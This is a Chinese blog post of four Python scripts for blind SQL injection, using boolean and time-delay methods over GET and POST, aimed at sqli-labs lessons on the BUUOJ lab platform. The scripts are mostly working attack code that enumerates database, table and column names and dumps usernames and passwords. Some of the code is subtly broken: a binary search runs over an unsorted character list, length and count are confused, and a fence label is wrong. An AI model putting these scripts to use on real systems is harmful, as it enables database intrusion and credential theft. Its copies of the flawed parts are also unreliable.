---
title: SQL盲注脚本
categories:
  - 学习
tags:
  - SQL注入
  - 脚本
abbrlink: 3f5af4f2
---

## GET提交

### 布尔盲注脚本

```python
# boolean_blind.py
import requests

# 配置区（必须修改）
target_url = "http://f869feaa-0f94-4c32-82b1-4bef94ce759d.node5.buuoj.cn/Less-8/"
params = {"id": "1"}
#cookies = {"session": "your_cookie"}
#headers = {"User-Agent": "Mozilla/5.0"}
success_flag = "You are in."  # 存在真条件的页面特征

# 修改字符集顺序，优先小写字母
printable_chars = [
    *[str(i) for i in range(10)],    # 数字优先
    *[chr(i) for i in range(97, 123)],  # 小写字母
    *[chr(i) for i in range(65, 91)],   # 大写字母
    '_', '-', '@','#','*','!','·','+',';','\\','\''
]

def send_boolean_query(payload):
    """发送布尔查询并检测响应特征"""
    malicious_params = {**params, "id": f"1' AND {payload}-- -"}
    try:
        response = requests.get(
            target_url,
            params=malicious_params,
            #cookies=cookies,
            #headers=headers,
            timeout=5
        )
        return success_flag in response.text
    except Exception as e:
        print(f"[!] 请求失败: {e}")
        return False


def extract_data(query, length):
    """逐字符提取数据（区分大小写）"""
    result = ""
    for position in range(1, length + 1):
        for char in printable_chars:
            # 添加BINARY确保大小写敏感
            payload = f"BINARY SUBSTRING(({query}),{position},1)='{char}'"
            if send_boolean_query(payload):
                result += char
                print(f"[+] 当前结果: {result}")
                break
        else:
            result += "?"
            print(f"[!] 第{position}位字符无法识别")
    return result

def get_data_length(query):
    """获取数据长度"""
    length = 0
    # 扩大长度范围防止溢出
    for i in range(1, 100):
        payload = f"LENGTH(({query}))={i}"
        if send_boolean_query(payload):
            length = i
            break
    return length

def main():
    # 获取数据库名
    db_length = get_data_length("SELECT database()")
    db_name = extract_data("SELECT database()", db_length)
    print(f"[*] 数据库名称: {db_name}")
    #db_name='security'


    # 获取表名
    # 获取表数量（修正长度问题）
    count_query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}'"
    count_length = get_data_length(count_query)
    table_count_str = extract_data(count_query, count_length)
    table_count = int(table_count_str)
    print(f"[*] 发现{table_count}个表")
    #获取表名
    tables = []
    for i in range(table_count):
        table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1"
        table_length = get_data_length(table_query)
        table_name = extract_data(table_query, table_length)
        tables.append(table_name)
    print(f"[*] 表列表: {tables}")

    #tables=['emails', 'referers', 'uagents', 'users']



    # 获取列名
    #获取列数量
    table_name=tables[3]
    column_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table_name}'"
    column_length = get_data_length(column_query)
    table_column_str = extract_data(column_query, column_length)
    column_count = int(table_column_str)
    print(f"[*] 发现{column_count}个列")
    #获取列名
    columns=[]
    for i in range(column_count):
        column_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {i},1"
        column_length = get_data_length(column_query)
        column_name = extract_data(column_query, column_length)
        columns.append(column_name)
    print(f"[*] 表列表: {columns}")

    #columns=['id', 'username', 'password', 'ip', 'time', 'USER', 'CURRENT_CONNECTIONS', 'TOTAL_CONNECTIONS', 'id', 'username', 'password']

    #获取数据
    # 查看数据内容
    target_column = columns[1]
    #['id', 'username', 'password', 'ip', 'time', 'USER', 'CURRENT_CONNECTIONS', 'TOTAL_CONNECTIONS', 'id', 'username', 'password']

    # 获取数据总数量
    data_count_query = f"SELECT COUNT({target_column}) FROM {table_name}"
    data_count_length = get_data_length(data_count_query)
    data_count_str = extract_data(data_count_query, data_count_length)
    data_count = int(data_count_str)
    print(f"[*] 发现{data_count}条数据")

    #获取数据内容
    data_values=[]
    for i in range(data_count):
        # 获取当前行的字符串长度（字符数）
        length_query = f"SELECT CHAR_LENGTH({target_column}) FROM {table_name} LIMIT {i},1"
        str_length = int(extract_data(length_query, 1))

        # 逐字符提取数据
        current_value = []
        for pos in range(1, str_length + 1):
            char_query = f"SELECT SUBSTRING({target_column}, {pos}, 1) FROM {table_name} LIMIT {i},1"
            char = extract_data(char_query, 1)
            current_value.append(char)

        # 拼接完整字符串
        full_string = ''.join(current_value)
        data_values.append(full_string)

    print(f"[*] 数据记录: {data_values}")

if __name__ == "__main__":
    main()
```



### 时间盲注脚本

```sql
# time_blind.py
import requests
import time

# 配置区（必须修改）

target_url = "http://540c7869-5b16-44dd-b1a3-2fdeed88bcb8.node5.buuoj.cn/Less-9/"
params = {"id": "1"}
# cookies = {"session": "your_cookie"}
# headers = {"User-Agent": "Mozilla/5.0"}
delay_seconds = 2  # 延迟时间（根据网络情况调整）
time_threshold = 1.5  # 时间判断阈值

# 修改字符集顺序，优先小写字母
printable_chars = [
    *[str(i) for i in range(10)],  # 数字优先
    *[chr(i) for i in range(97, 123)],  # 小写字母
    *[chr(i) for i in range(65, 91)],  # 大写字母
    '_', '-', '@', '#', '*', '!', '·', '+', ';', '\\', '\''
]


def send_time_query(payload):
    """发送时间盲注查询并检测响应时间"""
    malicious_params = {**params, "id": f"1' AND IF({payload}, SLEEP({delay_seconds}), 0)-- -"}
    try:
        start_time = time.time()
        response = requests.get(
            target_url,
            params=malicious_params,
            # cookies=cookies,
            # headers=headers,
            timeout=delay_seconds + 2
        )
        elapsed = time.time() - start_time
        return elapsed >= time_threshold
    except requests.exceptions.Timeout:
        return True  # 超时视为条件为真
    except Exception as e:
        print(f"[!] 请求失败: {e}")
        return False


def extract_data(query, length):
    """逐字符提取数据（区分大小写）"""
    result = ""
    for position in range(1, length + 1):
        for char in printable_chars:
            payload = f"BINARY SUBSTRING(({query}),{position},1)='{char}'"
            if send_time_query(payload):
                result += char
                print(f"[+] 当前结果: {result}")
                break
        else:
            result += "?"
            print(f"[!] 第{position}位字符无法识别")
    return result


def get_data_length(query):
    """获取数据长度"""
    length = 0
    for i in range(1, 100):
        payload = f"LENGTH(({query}))={i}"
        if send_time_query(payload):
            length = i
            print(f"长度为{i}")
            break
    return length


def main():
    # 获取数据库名
    db_length = get_data_length("SELECT database()")
    db_name = extract_data("SELECT database()", db_length)
    print(f"[*] 数据库名称: {db_name}")

    # 获取表名
    count_query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}'"
    table_count = int(extract_data(count_query, get_data_length(count_query)))
    print(f"[*] 发现{table_count}个表")

    tables = []
    for i in range(table_count):
        table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1"
        tables.append(extract_data(table_query, get_data_length(table_query)))
    print(f"[*] 表列表: {tables}")

    # 获取列名
    table_name = tables[3]  # 假设目标表是users
    count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table_name}'"
    column_count = int(extract_data(count_query, get_data_length(count_query)))

    columns = []
    for i in range(column_count):
        column_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {i},1"
        columns.append(extract_data(column_query, get_data_length(column_query)))
    print(f"[*] 列列表: {columns}")

    # 提取数据
    target_column = "password"  # 假设目标列是password
    count_query = f"SELECT COUNT({target_column}) FROM {table_name}"
    data_count = int(extract_data(count_query, get_data_length(count_query)))

    data_values = []
    for i in range(data_count):
        length_query = f"SELECT CHAR_LENGTH({target_column}) FROM {table_name} LIMIT {i},1"
        str_length = int(extract_data(length_query, get_data_length(length_query)))

        value = extract_data(f"SELECT {target_column} FROM {table_name} LIMIT {i},1", str_length)
        data_values.append(value)
    print(f"[*] 数据记录: {data_values}")


if __name__ == "__main__":
    main()
```

## POST 提交

### 布尔盲注脚本

```python
# post_boolean_blind.py
import requests

# 配置区（必须根据实际情况修改）
target_url = "http://20713fce-cbb8-4cbb-896b-764aa94014ff.node5.buuoj.cn/Less-15/"
post_data = {
    "uname": "1",
    "passwd": "1",
    "submit": "Submit"
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."
}

# 响应特征配置（关键！需要根据实际情况设置）
true_condition = "Welcome"    # 条件为真时页面包含的特征字符串
false_condition = "Error"     # 条件为假时页面包含的特征字符串

# 优化后的字符集顺序（可根据实际情况调整）
printable_chars = [
    *[str(i) for i in range(10)],
    *[chr(i) for i in range(97, 123)],  # 小写字母
    *[chr(i) for i in range(65, 91)],   # 大写字母
    '_', '-', '@', '#', '*', '!', '·', '+', ';', '\\', '\''
]

def send_boolean_query(payload, inject_param="uname"):
    """发送布尔盲注查询"""
    malicious_data = {
        **post_data,
        inject_param: f"1' OR ({payload})-- -",  # 注意闭合方式
        "submit": "Submit"
    }
    
    try:
        response = requests.post(
            target_url,
            data=malicious_data,
            headers=headers,
            timeout=5
        )
        # 根据页面内容判断条件真假
        content = response.text
        return (true_condition in content) and (false_condition not in content)
    except Exception as e:
        print(f"[!] 请求失败: {e}")
        return False

def extract_data(query, length):
    """逐字符提取数据（优化版二分法）"""
    result = ""
    for position in range(1, length + 1):
        low = 0
        high = len(printable_chars) - 1
        
        while low <= high:
            mid = (low + high) // 2
            char = printable_chars[mid]
            
            # 构造ASCII比较的payload（更高效）
            payload = f"ASCII(SUBSTRING(({query}),{position},1))={ord(char)}"
            if send_boolean_query(payload):
                result += char
                print(f"[+] 当前结果: {result}")
                break
                
            # 判断是否小于中间值
            payload = f"ASCII(SUBSTRING(({query}),{position},1))<{ord(char)}"
            if send_boolean_query(payload):
                high = mid - 1
            else:
                low = mid + 1
        else:
            result += "?"
            print(f"[!] 第{position}位字符无法识别")
    return result

def get_data_length(query):
    """获取数据长度（优化版二分查找）"""
    print(f"[*] 正在获取长度: {query}")
    low = 1
    high = 100  # 假设最大长度不超过100
    
    while low <= high:
        mid = (low + high) // 2
        payload = f"LENGTH(({query}))={mid}"
        if send_boolean_query(payload):
            return mid
            
        payload = f"LENGTH(({query}))<{mid}"
        if send_boolean_query(payload):
            high = mid - 1
        else:
            low = mid + 1
    return 0

def main():
    # 验证注入点
    test_payload = "1=1"
    if send_boolean_query(test_payload):
        print("[+] 布尔盲注验证成功")
    else:
        print("[!] 注入失败，请检查配置")
        return

    # 获取数据库名
    db_length = get_data_length("SELECT database()")
    db_name = extract_data("SELECT database()", db_length)
    print(f"[*] 数据库名称: {db_name}")

    # 获取表信息
    count_query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}'"
    table_count = get_data_length(count_query)
    print(f"[*] 发现{table_count}个表")

    tables = []
    for i in range(table_count):
        table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1"
        table_length = get_data_length(table_query)
        table_name = extract_data(table_query, table_length)
        tables.append(table_name)
        print(f"[+] 已获取表：{table_name} ({i+1}/{table_count})")
    
    # 获取列信息（示例获取第一个表）
    if tables:
        target_table = tables[0]
        column_count = get_data_length(f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{target_table}'")
        
        columns = []
        for i in range(column_count):
            col_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{target_table}' LIMIT {i},1"
            col_length = get_data_length(col_query)
            column_name = extract_data(col_query, col_length)
            columns.append(column_name)
            print(f"[+] 已获取列：{column_name} ({i+1}/{column_count})")
        
        # 获取数据（示例获取前5条）
        if columns:
            target_column = columns[0]
            data_count = get_data_length(f"SELECT COUNT({target_column}) FROM {target_table}")
            
            print(f"[*] 开始提取{data_count}条数据...")
            for i in range(min(data_count, 5)):  # 限制5条防止过多请求
                data_query = f"SELECT {target_column} FROM {target_table} LIMIT {i},1"
                data_length = get_data_length(data_query)
                data_value = extract_data(data_query, data_length)
                print(f"[+] 数据{i+1}: {data_value}")
    else:
        print("[!] 未找到可用表")

if __name__ == "__main__":
    main()

```



### 时间盲注脚本

```python
# post_time_blind.py
import requests
import time

# 配置区修改
target_url = "http://20713fce-cbb8-4cbb-896b-764aa94014ff.node5.buuoj.cn/Less-15/"
post_data = {
    "uname": "1",  # 主要注入点参数
    "passwd": "1",  # 备用注入点参数
    "submit": "Submit"
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36..."
}
delay_seconds = 2  # 延迟时间
time_threshold = 1.5  # 时间判断阈值

# 优化后的字符集顺序（保持原样）
printable_chars = [
    *[str(i) for i in range(10)],
    *[chr(i) for i in range(97, 123)],
    *[chr(i) for i in range(65, 91)],
    '_', '-', '@', '#', '*', '!', '·', '+', ';', '\\', '\''
]

def send_time_query(payload, inject_param="uname"):
    """发送POST时间盲注查询（新增inject_param参数指定注入点）"""
    # 构造恶意POST数据（选择注入参数）
    malicious_data = {
        **post_data,
        inject_param: f"1' or IF({payload}, SLEEP({delay_seconds}), 0)-- -",  # 注意闭合方式
        "submit": "Submit"
    }

    try:
        start_time = time.time()
        response = requests.post(
            target_url,
            data=malicious_data,
            headers=headers,
            timeout=delay_seconds + 2
        )
        elapsed = time.time() - start_time
        return elapsed >= time_threshold
    except requests.exceptions.Timeout:
        return True
    except Exception as e:
        print(f"[!] 请求失败: {e}")
        return False



def extract_data(query, length):
    """逐字符提取数据（区分大小写）"""
    result = ""
    for position in range(1, length + 1):
        for char in printable_chars:
            # 添加BINARY确保大小写敏感
            payload = f"BINARY SUBSTRING(({query}),{position},1)='{char}'"
            if send_time_query(payload):
                result += char
                print(f"[+] 当前结果: {result}")
                break
        else:
            result += "?"
            print(f"[!] 第{position}位字符无法识别")
    return result

def get_data_length(query):
    """获取数据长度"""
    length = 0
    # 扩大长度范围防止溢出
    for i in range(1, 100):
        payload = f"LENGTH(({query}))={i}"
        if send_time_query(payload):
            length = i
            break
    return length

def main():
    # 获取数据库名
    # db_length = get_data_length("SELECT database()")
    # db_name = extract_data("SELECT database()", db_length)
    # print(f"[*] 数据库名称: {db_name}")
    db_name='security'


    # 获取表名
    # 获取表数量（修正长度问题）
    count_query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}'"
    count_length = get_data_length(count_query)
    table_count_str = extract_data(count_query, count_length)
    table_count = int(table_count_str)
    print(f"[*] 发现{table_count}个表")
    #获取表名
    tables =[] #['emails', 'referers', 'uagents', 'users'] #[]
    for i in range(table_count):
        table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1"
        table_length = get_data_length(table_query)
        table_name = extract_data(table_query, table_length)
        tables.append(table_name)
    print(f"[*] 表列表: {tables}")


    # 获取列名
    #获取列数量
    table_name=tables[3]
    column_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table_name}'"
    column_length = get_data_length(column_query)
    table_column_str = extract_data(column_query, column_length)
    column_count = int(table_column_str)
    print(f"[*] 发现{column_count}个列")

    #获取列名
    columns=[]  #这里用字符串会报错！！！
    for i in range(column_count):
        column_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {i},1"
        column_length = get_data_length(column_query)
        column_name = extract_data(column_query, column_length)
        columns.append(column_name)
    print(f"[*] 表列表: {columns}")

    #columns=['id', 'username', 'password', 'ip', 'time', 'USER', 'CURRENT_CONNECTIONS', 'TOTAL_CONNECTIONS', 'id', 'username', 'password']

    #获取数据
    # 查看数据内容
    target_column = 'password' #columns[1]
    #['id', 'username', 'password', 'ip', 'time', 'USER', 'CURRENT_CONNECTIONS', 'TOTAL_CONNECTIONS', 'id', 'username', 'password']

    # 获取数据总数量
    data_count_query = f"SELECT COUNT({target_column}) FROM {table_name}"
    data_count_length = get_data_length(data_count_query)
    data_count_str = extract_data(data_count_query, data_count_length)
    data_count = int(data_count_str)
    print(f"[*] 发现{data_count}条数据")

    #获取数据内容
    data_values=[]
    for i in range(data_count):
        # 获取当前行的字符串长度（字符数）
        length_query = f"SELECT CHAR_LENGTH({target_column}) FROM {table_name} LIMIT {i},1"
        str_length = int(extract_data(length_query, 1))

        # 逐字符提取数据
        current_value = []
        for pos in range(1, str_length + 1):
            char_query = f"SELECT SUBSTRING({target_column}, {pos}, 1) FROM {table_name} LIMIT {i},1"
            char = extract_data(char_query, 1)
            current_value.append(char)

        # 拼接完整字符串
        full_string = ''.join(current_value)
        data_values.append(full_string)

    print(f"[*] 数据记录: {data_values}")

if __name__ == "__main__":
    main()

```

